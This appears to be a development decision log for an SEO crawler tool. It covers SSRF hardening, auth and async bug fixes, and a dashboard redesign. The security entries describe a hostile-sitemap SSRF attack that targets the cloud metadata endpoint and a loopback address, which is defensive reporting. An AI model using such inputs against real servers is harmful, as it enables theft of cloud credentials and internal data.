built its own `Crawler`. This is the same seam the project already uses for the OpenAI
`Completer` and the crawler's `sleep` function — nothing about the layering rule needed amending,
a fourth thing just got injected through it. An embedder that only wants the read-only API passes
no runner, and `POST /api/crawls` answers `501`.

**Decision: target safety composes into the crawler's existing per-hop gate.** A public URL can
redirect into `169.254.169.254` on its second hop, and `Fetcher.fetch` already calls an `allowed`
predicate before every hop — that is what the third review pass added, for robots.txt. Rather
than bolt on a second check that only the first request would see, `Crawler.target_ok` is a
predicate the caller may set (default: allow everything, which is what the CLI gets), and
`Crawler._gate` composes it with `policy.allowed`: `lambda url: policy.allowed(url) and
self.target_ok(url)`. Both `_enqueue` and `_process` now call that composed callable and never
`policy.allowed` directly, so a redirect chain is checked exactly as thoroughly as the first
request, through code already proven correct for robots. *(This covered the frontier —
`_enqueue`/`_process` — but not robots.txt and sitemap discovery, which ran before the gate
existed; see the SSRF hardening entry below.)*

**Decision: the allowlist narrows, it never widens.** `SEO_SCOUT_ALLOWED_DOMAINS` restricts a
deployment to specific registrable domains; it answers "which sites may this deployment audit",
not "which sites may skip the address rules". `targets.check_url` and `resolve_reason` run
unconditionally, allowlist or not: an allowlisted domain that resolves into a private range is
refused exactly like any other. Treating the allowlist as a bypass would turn a safety feature
into the thing that defeats the other safety feature the moment an operator configured it.

**Decision: the gate is on the API path only.** `seo-scout crawl http://127.0.0.1:8099/` still
works from the CLI, unchanged — `dev/fixture_site.py` depends on it, and the person typing a URL
into a terminal already has shell access to the box, so the check has nothing left to prove
there. The check exists for the person typing into a browser, who does not.

**Decision: reconciliation uses a wall-clock cutoff, not "every running row".** A process killed
mid-crawl leaves its run row `running` forever, which `previous_run` would then pick as the diff
baseline. Marking every `running` row `failed` on `serve` startup would also kill a CLI crawl
that happens to be running against the same database file when `serve` starts. Only rows older
than `wall_clock_seconds` (the crawler's own hard cap) are touched: nothing legitimate can still
be running past that age, so reconciliation cannot be wrong in the direction the fourth review
pass already fixed for in-process crashes.

**Decision: no cancel, on purpose.** `asyncio.Task.cancel()` raises `asyncio.CancelledError`
inside the crawl, and that exception derives from `BaseException`, not `Exception` —
`Crawler.run`'s own guard (the one that marks a run `failed` on any exception, from the fourth
review pass) only catches `Exception`, so a cancelled task would leave the row `running` and
defeat the reconciliation this pass just added. A cancel button that is actually safe means
threading a cooperative stop signal through the fetch loop instead of relying on `Task.cancel()`,
which is real work left undone; `--max-pages` and the 30-minute wall clock bound a mistaken crawl
instead.

**Bug: two routes never had the auth they were supposed to have.** `token_guard` is a dependency
on `router`, and `app.include_router(router, dependencies=[Depends(token_guard)])` is where every
`/api/*` route gets it — except FastAPI mounts `/api/docs` and `/openapi.json` on the `FastAPI`
app itself, not through `router`, so neither one ever passed through the guard. A hosted
deployment with a token configured was still handing an unauthenticated caller the full API
schema. The fix does not add a guard to a route FastAPI does not let you attach one to:
`docs_url` and `openapi_url` are set to `None` outright whenever a token is configured, so the
routes do not exist at all (`404`, not `401` — a caller cannot even confirm they were once
there), and left alone when no token is set, since an unauthenticated local deployment has no
schema to protect in the first place.

**Bug: the endpoint ran in a threadpool and returned 500 for every request, and 441 tests
passed anyway.** `POST /api/crawls` was declared `def`, which FastAPI runs in a worker thread
because a synchronous function might block. `BackgroundCrawler.start` calls
`asyncio.create_task()`, which requires a running event loop in the calling thread — a
threadpool worker has none, so every real call raised `RuntimeError: no running event loop` and
the endpoint answered `500`. The full suite was green through this: every test that posted to
`/api/crawls` injected a fake runner whose `start()` just appends to a list, so nothing in the
suite ever called `create_task` and nothing ever hit the missing loop. The fix makes the handler
`async def`, which FastAPI then runs on the event loop directly, and moves the one blocking step
— the DNS lookup inside `resolve_reason` — off that loop with `asyncio.to_thread`, so a slow or
hanging resolution cannot freeze it for every other request. The regression test that would have
caught this, `test_a_real_runner_actually_schedules_the_crawl`, uses a real `BackgroundCrawler`
for exactly that reason: a fake collaborator that never exercises the thing that broke cannot be
trusted to prove the seam works.

## Post-launch — Closing the SSRF gaps a security review found in the crawl button

**Trigger.** A review of the crawl-button feature above found the target-safety gate was real
but incomplete: discovery ran outside it entirely, the DNS cache had no time bound, and the
login cookie lacked `Secure`. All three are in the same feature, so one entry covers them.

**Bug: discovery ran before the composed gate existed, and was not gated at all.**
`Crawler._crawl` called `self._discover(start_url)` before `state.allowed` (robots.txt composed
with `target_ok`) was built, so `fetch_robots` and `discover_seeds` never saw `target_ok` —
and `discover_seeds`'s own sitemap fetcher, `_get_text`, checked nothing at all, not even
`same_site`. A `Sitemap:` line in a crawled site's own robots.txt was fetched exactly as
written, so a hostile or compromised site could name `http://169.254.169.254/latest/meta-data/`
as its sitemap and have this server fetch it — confirmed with a respx-mocked reproduction
before the fix (the metadata route's `.called` was `True`). `_get_text` also called
`client.get(url, follow_redirects=True)`, so any redirect a same-site `sitemap.xml` returned
was followed with no check on the target, same-site or not — a same-site sitemap 302ing to
`http://127.0.0.1:9999/secret` reached it. The fix: `Crawler._discover` now builds the composed
gate immediately after `fetch_robots` returns (a policy is required to build one) and passes it
into `discover_seeds(..., allowed=gate)`; `discover_seeds` defaults `allowed` to permit-all so
the CLI is unaffected. `_get_text` checks `allowed` before every request it makes, including the
first, and follows redirects by hand — bounded to three hops, `allowed` re-checked on every
`Location` — instead of handing `follow_redirects=True` to httpx, since real sitemaps do
redirect (commonly http to https) and `Fetcher.fetch` cannot be reused here: it enforces an
HTML content-type and would reject sitemap XML as `non_html`. Three new tests in
`test_crawler.py` cover the robots-named case, the redirecting-sitemap case, and a permissive-
default regression guard proving discovery still works for the CLI.

**Bug: the DNS cache had no time bound, so one public resolution exempted a host forever.**
`targets.resolve_reason` was `@lru_cache(maxsize=512)` with no expiry: once a host resolved
publicly, that result served every check for the life of the `serve` process, regardless of what
the host's DNS answered later. The README described this as a timing race ("a host that answers
safely at check time and differently a moment later"), which understated it — an attacker's
domain need only resolve publicly once, ever, ahead of an otherwise-unrelated request, to be
permanently exempt. The fix keeps the `lru_cache` (the DNS lookup itself is still worth caching:
`allowed()` runs for every link a crawl enqueues) but keys it on `(host, epoch)` where
`epoch = int(time.monotonic() // 60)`, in a new private `_resolve_reason_cached`; the public
`resolve_reason(host)` computes the current epoch and delegates. Sixty seconds still gives the
"one lookup per host per crawl" the cache exists for — a crawl finishes well inside that window
— while guaranteeing re-resolution at least that often. No new dependency: the stack forbids
adding one (`cachetools` was the obvious alternative) and a hand-rolled epoch bucket is a few
lines. The README's "Honest limitations" entry is corrected to describe the real residual risk —
no IP pinning through to the fetch, not a narrow window — and `test_targets.py` gained a test
that moves the clock forward a bucket and proves the host is re-resolved, not served from the
earlier window forever.

**Bug: the login cookie had no `Secure` attribute.** `auth.login` set
`httponly=True, samesite="strict"` but not `secure`, so on a hosted deployment behind a
TLS-terminating proxy (which the README tells operators to use) the token could still be sent
over a plaintext connection if one ever occurred — misconfigured proxy, a stray HTTP listener,
whatever. It could not simply be hardcoded `True`: local HTTP use with a token must keep
working, and a `Secure` cookie is never sent back over plain HTTP at all. The fix derives it per
request: `secure=True` when `request.url.scheme == "https"` or the request carries
`x-forwarded-proto: https` (the header a TLS-terminating proxy sets), so a direct HTTPS
deployment and a proxied one both get the attribute while local HTTP is unchanged.

## Post-launch — The Enter key, and a behaviour that could not be tested

**Trigger.** One line stood unverified in CLAUDE.md: pressing **Enter** in the dashboard's two
input fields. Both were implemented — the crawl bar with an explicit `keydown` listener,
sign-in as a real `<form>` with a `submit` handler — but no automated check had ever confirmed
either, and the note said so rather than assuming they worked.

**What the browser showed.** The crawl bar is fine: Enter fires the listener, posts
`/api/crawls`, and renders the gate's refusal (`127.0.0.1 is a loopback address`) — one
keystroke exercising the listener and the SSRF gate together. Sign-in could not be confirmed,
and instrumenting the page said exactly why. The automation dispatches a trusted `keydown` and
`keyup` with `code: ""` and `which: 0`, and **no `keypress`** — and implicit form submission is
the browser's response to the keypress. The handler itself was sound (`form.requestSubmit()`
ran it: wrong token rejected, right token signed in); the keystroke simply never arrived in the
shape a form needs.

**Non-obvious decision.** Rather than leave a behaviour that only a human can check, sign-in
now has the same explicit `keydown` listener as the crawl bar. The point is not that implicit
submission is broken — it is HTML working as specified — but that a behaviour no test can reach
is a behaviour that silently rots. Two identical fields should not be verifiable by two
different standards. The listener costs one line and moves sign-in from "specified to work" to
"observed to work": Enter now produces exactly one `POST /api/login`, 401 with the error
rendered on a wrong token, 200 and the dashboard on the right one.

**Failure mode prevented.** Both Enter paths are now pinned by a parametrised test asserting
the listener exists for `#crawl-url` and `#signin-token`, so neither can be quietly dropped in
a later edit of the dashboard's one script block. And `signIn` opens with `if (btn.disabled)
return;`: cancelling the `keydown` suppresses the keypress in every browser that matters, but
if some browser ever ran both paths, the guard means one sign-in, not two.

**What I chose not to do.** No headless-browser test rig (Playwright, jsdom) for one script
block. The dashboard is deliberately one static file with no build step; adding a browser
runtime and a Node toolchain to assert a two-line listener would cost more to explain than the
behaviour is worth. The test asserts the wiring, and a browser confirmed the behaviour once,
by hand, on the record here.

## Post-launch — The dashboard, redesigned around the first ten seconds

**Trigger.** The dashboard was built to prove the pipeline, and it read like it: an amber-on-
near-black instrument panel that assumed you already knew what a crawl, an audit and a
validated rewrite were. The brief for this pass was a product someone would pay for — the same
data, arranged for a person who has just arrived.

**The palette, and why gray-green.** The reference was firecrawl.dev: a light near-white
canvas, hairline borders, generous radii, one accent used sparingly, a faint dot grid behind
the masthead, and mono reserved for data. Its accent is a hot orange; this one is a low-chroma
moss (`#2f6b4f` light, `#7cc39a` dark) on a gray-green paper (`#f4f6f3` / `#0f1512`). Nothing
is pure white or pure black. That is not decoration: this is a page someone stares at while
working through 50 rows, and maximum contrast at maximum saturation is what makes that tiring.
The severity colours stay distinct but were desaturated to match — a clay red rather than a
signal red. Light is now the base and dark follows the OS, because the tool is used in daylight
more often than not; `?theme` still outranks everything for screenshots.

**Typography.** Geist and Geist Mono, the closest honest match to the reference's Suisse and
GeistMono pairing, with a full fallback stack: if Google Fonts is unreachable the page renders
in the platform grotesk and looks ordinary rather than broken.

**What changed for the person using it.**
- **A first run has a first screen.** With no runs the page used to print a CLI command in a
  warning box. It now shows one sentence and one field — and the crawl bar itself *moves* into
  that empty state rather than being duplicated, so there is one input, one set of listeners,
  and nothing to keep in sync. It moves back when a run exists.
- **Four chips** — all pages, needs work, has a rewrite, clean — do in one click what
  previously took two dropdowns, and stack with the dropdowns for the rarer questions.
- **The detail panel got a head**: the score, the URL, close, and `‹ ›` that walk the *filtered*
  list, so reviewing thirty pages is thirty keystrokes rather than thirty scroll-and-clicks.
- **`/` focuses the filter, Esc closes the panel.** Two keys, both the ones people try anyway.
- **A theme toggle** that remembers, because a hosted dashboard is opened by someone whose OS
  preference is not the author's.
- **A crawl shows a moving progress strip**, not only a line of text.
- **Signed out, the controls that would only 401 are gone** — run picker, crawl bar, exports.
- **The table becomes cards under 780px.** A phone is a plausible way to read a report.

**Non-obvious decision.** `[hidden] { display: none !important; }` is now a global rule. Most
sections here are grid or flex containers, and the UA's own `[hidden]` rule loses to an explicit
`display` at equal specificity — the exact bug this project already shipped once, in the sign-in
panel, and would have shipped again in the empty state. A test pins the line.

**Failure mode prevented.** Chart.js copies its colours at construction time, so the theme
toggle rebuilds both charts rather than only repainting the CSS around them. And the rule chart
reserves its label gutter outright (`y.afterFit`), because Chart.js would rather clip
`meta_description_too_short` than give up plot width — which it did, until a full-page
screenshot showed it.

**What I chose not to do.** No framework, no build step, no component library: still one HTML
file served by `api/app.py`, still Chart.js from a CDN with an integrity hash. The redesign is
CSS and a few dozen lines of vanilla JS, which keeps the dependency story of the whole project
"httpx, selectolax, sqlite3, openai" rather than "…and a frontend toolchain".
